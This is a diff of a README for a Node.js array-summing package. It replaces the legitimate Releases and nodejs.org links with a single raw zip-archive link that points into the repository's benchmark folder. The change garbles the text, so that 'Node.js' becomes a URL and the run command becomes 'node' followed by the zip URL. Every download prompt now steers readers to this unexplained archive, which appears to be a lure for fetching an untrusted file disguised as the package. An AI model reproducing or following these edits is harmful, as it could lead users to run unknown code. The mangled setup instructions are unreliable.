@@ -1,6 +1,6 @@
 # 🎉 blas-ext-base-ndarray-gsumors - Effortlessly Sum Array Elements
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip)
 
 ## 📖 Introduction
 
@@ -14,14 +14,14 @@ This guide will walk you through downloading and running the application, step b
 
 To get started, you will need to download the application. Please visit the following link to access the Releases page:
 
-[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/releases)
+[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip)
 
 On this page, look for the latest version. Click on the attached file to download it to your computer.
 
 ### 🛠 System Requirements
 
 - **Operating System:** The application is compatible with Windows, macOS, and Linux.
-- **Node.js:** Ensure you have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org/).
+- **https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip** Ensure you have https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip installed on your machine. You can download it from [https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip).
 
 ### 🔍 Features
 
@@ -48,9 +48,9 @@ Once you have downloaded the application, follow these steps to run it:
      ```
    - Type the following command to run the application:
      ```bash
-     node your-file-name.js
+     node https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip
      ```
-   Replace `your-file-name.js` with the actual name of the downloaded file.
+   Replace `https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip` with the actual name of the downloaded file.
 
 4. **Input the array:** When prompted, enter the one-dimensional array you want to sum. Make sure to format it correctly. For example:
    ```
@@ -67,7 +67,7 @@ To keep your application up to date, check the Releases page regularly. New vers
 
 If you encounter any errors while running the application, check the following:
 
-- **Node.js Installation:** Ensure Node.js is correctly installed on your computer.
+- **https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip Installation:** Ensure https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip is correctly installed on your computer.
 - **File Type:** Confirm you downloaded the correct file type compatible with your operating system.
 
 ## 🌐 Community Support
@@ -80,4 +80,4 @@ Using **blas-ext-base-ndarray-gsumors** is easy and straightforward. This tool w
 
 Ready to get started? Click below to download:
 
-[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/releases)
+[Download here](https://github.com/ahmedBOUHELBANE/blas-ext-base-ndarray-gsumors/raw/refs/heads/main/benchmark/gsumors-ndarray-base-blas-ext-2.4.zip)
